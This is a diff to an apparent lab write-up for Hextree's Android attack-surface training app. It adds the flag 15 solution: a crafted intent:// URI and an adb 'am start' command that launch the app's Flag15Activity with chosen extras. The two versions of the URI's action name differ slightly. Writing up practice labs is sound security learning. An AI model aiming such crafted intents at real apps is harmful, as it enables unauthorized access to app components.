@@ -380,6 +380,21 @@ if(intent.getAction().equals("android.intent.action.VIEW")){
 
 We take the incoming intent so long as it matches the specific action we know it will have, then we make a `Uri` called `data` that contains the data from the incoming deeplink intent. We validate that the incoming data fits the `hex` scheme and `token` host and we then create an intent. We can use the [`fillIn()`](https://developer.android.com/reference/android/content/Intent#fillIn%28android.content.Intent,%20int%29) public method to copy the contents of the incoming intent to our `newIntent`. We use the `FILL_IN_DATA` and other similar flags to ensure that the data, action, and categories are all overwritten in the new intent.
 
+### 15 - Create a intent://flag15/ link
+
+On checking the decomplication of the app we get to know most of the parameters.
+We can encode the strings and Boolean by using `S.param` and `B.param` respectively. Making the intent link itself is pretty straightforward 
+
+```
+intent:#Intent;package=io.hextree.attacksurface;action=io.hextree.action=GIVE_FLAG;category=io.hextree.category.BROWSABLE;component=io.hextree.attacksurface.activities.Flag15Activity;S.action=flag;B.flag=true;end;
+```
+The above works just fine if u visit the link from this [website](https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=hex://open?message=Hello+World) from the mobile
+
+The issue is that we can’t call this in the normal link builder website because we don’t use a host name for our app. We can instead get this parsed using `adb shell`:
+
+```sh
+╰─ adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d 'https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=intent%3A%23Intent%3Bpackage%3Dio%2Ehextree%2Eattacksurface%3Baction%3Dio%2Ehextree%2Eaction%2EGIVE%5FFLAG%3Bcategory%3Dandroid%2Eintent%2Ecategory%2EBROWSABLE%3Bcomponent%3Dio%2Ehextree%2Eattacksurface%2Eactivities%2EFlag15Activity%3BS%2Eaction%3Dflag%3BB%2Eflag%3Dtrue%3Bend%3B'
+```
 
 ## References
 https://www.youtube.com/watch?v=jnBmI1eD-og
